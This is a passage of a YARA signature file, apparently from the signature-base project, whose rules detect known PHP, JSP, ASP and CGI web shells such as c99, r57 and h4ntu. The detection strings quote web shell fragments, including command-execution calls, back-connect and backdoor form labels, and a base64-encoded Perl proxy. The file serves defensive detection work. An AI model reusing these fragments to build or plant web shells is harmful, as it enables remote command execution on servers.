		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b334d494564393f419af745dc1eeec7"
		logic_hash = "e81e5345bbe07ca85c94a3d8411f0dd3c418689ccae7115c098f718f9093b3bf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
		$s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s4 = "Writed by DreAmeRz" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dtool_Pro_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file DTool Pro.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c02c522c-8418-5760-869a-52b41785bebc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4771-L4783"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "366ad973a3f327dfbfb915b0faaea5a6"
		logic_hash = "e8f8b4ca2ab4607e700e897671fd230280763a70897b8ccfc31b3bcb7f2a1f4a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "r3v3ng4ns\\nDigite"
		$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
		$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Php_Include_W_Shell_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ddcf9031-2ec8-5a86-8326-60e4a699f494"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4799-L4810"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4e913f159e33867be729631a7ca46850"
		logic_hash = "a63910d97b7ef447b2cadb7de12943d3dbb6eada27d3097b8acf58d9b65b6f60"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
		$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Safe0Ver_Shell__Safe_Mod_Bypass_By_Evilc0Der_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "25971f62-33ee-5ed6-8d72-118be5bd2deb"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4811-L4823"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6163b30600f1e80d2bb5afaa753490b6"
		logic_hash = "46f6bb38f1175e02b03047c06a7aed968b1c1ce2e28cc4b88e15703040e91592"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Safe0ver" fullword
		$s1 = "Script Gecisi Tamamlayamadi!"
		$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shell_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4824-L4836"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1a95f0163b6dea771da1694de13a3d8d"
		logic_hash = "dbd08e71dc512f8dcf009150fb4448cd3608291ef9078c7e6b86e6f8d820bd94"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
		$s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
		$s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Telnet_Cgi_2
{
	meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ca3dace-cd80-58e4-a4de-47dcc64dac0e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4837-L4849"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dee697481383052980c20c48de1598d1"
		logic_hash = "689c1d43c64aa7469989686c60fc9ab46acde42fdf3c1157bae1e2b8373c845f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ironshell_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file ironshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0d63ad03-4d1d-535f-8afe-3edaf1bf4010"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4850-L4864"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		logic_hash = "23574299ee2bb33c3f71102adf71ac8f09b6f8ece5f798beacb9b2432d297ee7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "www.ironwarez.info"
		$s1 = "$cookiename = \"wieeeee\";"
		$s2 = "~ Shell I"
		$s3 = "www.rootshell-team.info"
		$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Backdoorfr_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file backdoorfr.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5ba2b617-a873-5e80-9cfc-c61cc8d605f3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4865-L4876"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "91e4afc7444ed258640e85bcaf0fecfc"
		logic_hash = "40a6fb41a65fd35acb7cdc36fdda90f5dc54b641adc3ba9eaae29c5e46622206"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
		$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmdjsp_Jsp_2
{
	meta:
		description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "048478a8-9622-54c7-80ed-e4e223d14500"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4891-L4904"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b815611cc39f17f05a73444d699341d4"
		logic_hash = "8b0e425c7d71ea2c536192ff186665e7f0fbdbc0e0d195d7107ac57cf9bd1773"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
		$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s2 = "cmdjsp.jsp"
		$s3 = "michaeldaw.org" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_H4Ntu_Shell__Powered_By_Tsoi__2
{
	meta:
		description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "186358e6-88a3-5fad-b1ba-a49b2a5dea1c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4905-L4916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "06ed0b2398f8096f1bebf092d0526137"
		logic_hash = "32c620a4ed3f7a8640928e2211516978c12cfbdedb7d96e923303740407b5a1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "h4ntu shell"
		$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ajan_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file Ajan.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6040fd88-b992-5110-8b37-7711ace30b1a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4917-L4929"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b6f468252407efc2318639da22b08af0"
		logic_hash = "13988af864a62ca04501288d4f2d830815ab453b14cef6795fe993db1dd1a9ef"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "c:\\downloaded.zip"
		$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
		$s3 = "http://www35.websamba.com/cybervurgun/"

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHANTASMA_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "21ff4cee-9cdc-57d1-9c43-e033fdb47de0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4930-L4943"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "52779a27fa377ae404761a7ce76a5da7"
		logic_hash = "d4a2a1bcc1ff3264b35f2b05d7de664b56807977f2a793fd87206f046a185d3b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ">[*] Safemode Mode Run</DIV>"
		$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
		$s2 = "[*] Spawning Shell"
		$s3 = "Cha0s"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Mysql_Web_Interface_Version_0_8_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "90616d2d-082b-5983-a859-62d1c5b8066e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4944-L4957"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		logic_hash = "f0a20870a3240948e3ef1ad61685b00c5fc90d6098b87af9ac43ab44ccd13c9e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
		$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
		$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simple_Cmd_Html_2
{
	meta:
		description = "Semi-Auto-generated  - file simple_cmd.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "30990574-02a0-5eed-8317-847b6be13300"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4958-L4971"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c6381412df74dbf3bcd5a2b31522b544"
		logic_hash = "56b5b9e5518fa8a4be8c48735e997a538b0e534ad8fd72c1419dc0e8353bbc00"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>G-Security Webshell</title>" fullword
		$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__1_C2007_Php_Php_C100_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "00ada6a4-a32a-5184-867d-e10a8c95c41c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4972-L4986"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6f6cb7c210bcd0f84c2ccff52850b1d673622ae49b83d614d63b5bbba7392327"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash1 = "d089e7168373a0634e1ac18c0ee00085"
		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"

	condition:
		1 of them
}

rule SIGNATURE_BASE__Nst_Php_Php_Img_Php_Php_Nstview_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "238242f5-4e57-5edb-8806-ea5e06f1f637"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4987-L5002"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b1e13f75edbbc8f9263e0e516a54330ce57190ba0b45813dad4bafeaeefa389b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash2 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
		$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
		$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"

	condition:
		1 of them
}

rule SIGNATURE_BASE__Network_Php_Php_Xinfo_Php_Php_Nfm_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4fd11db6-902d-5f1a-96c5-9dfcccce7488"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5003-L5017"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "913ff19b6448d3b074440c2a5f85d85813fdf010d33dc57c89ba1e5db6455e11"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "acdbba993a5a4186fd864c5e4ea0ba4f"
		hash1 = "2601b6fc1579f263d2f3960ce775df70"
		hash2 = "401fbae5f10283051c39e640b77e4c26"

	strings:
		$s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
		$s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"

	condition:
		all of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5018-L5033"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a4bae5456baf0d8d894165c84d66118f2b16cfc040e299c2032eccb6a9eb4822"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
		$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5034-L5051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0df3e00f752f85aa1f150c01e3ef41b9a5cd3d3ce2060965992320cb3c4d87ae"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "8023394542cddf8aee5dec6072ed02b5"
		hash4 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash5 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
		$s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"

	condition:
		1 of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_Sses_Php_Php_Ctt_Sh_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5052-L5068"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "137f98b636ec012d7d5e687f7d24ae88e8d3261360e60a4bbc03da248cce381e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
		$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
		$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Spy_Php_Php_S_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d287136c-534b-51a4-88fc-40ef9f22d910"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5069-L5083"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "09892789e8dad16f9fc7c4e22525e5d0af3af401a4b2655b70f7a6856888875c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash2 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_C99_Generic_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5084-L5104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "422bc3a0d9b04b1e37ad954faacb1ec7841fe529c1eb19634bdbfe83da374c73"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"
		hash6 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
		$s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
		$s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
		$s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"

	condition:
		all of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5105-L5122"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b133cf947476a1c94ed90b5cd3757ca8aa429be4284d75664625896d9cfa687f"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sess_data[\"cut\"] = array(); c99_s"
		$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c01ad0e5-1aff-5128-9d0c-5d0967532a4b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5123-L5137"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7bdaebfb093b58a2fd33b4bbeea8465d0f724383b4855eb521a3e339ee153781"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
		$s2 = "c99sh_sqlquery"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5138-L5154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6dbd40e19d4d5753dbd1f7e627bccc08a60430de8138a923f13e836d19dde65c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
